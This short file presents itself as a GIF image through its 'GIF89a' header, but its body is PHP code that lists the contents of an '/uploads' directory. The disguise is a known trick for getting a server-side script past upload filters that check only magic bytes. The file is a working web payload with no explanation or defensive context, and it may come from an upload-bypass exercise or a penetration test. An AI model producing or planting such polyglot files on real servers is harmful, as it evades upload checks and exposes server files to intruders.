GIF89a
<?php
    $d = scandir("/uploads");
    foreach ($d as $dd)
    {
        echo $dd . "\n";
    }
?>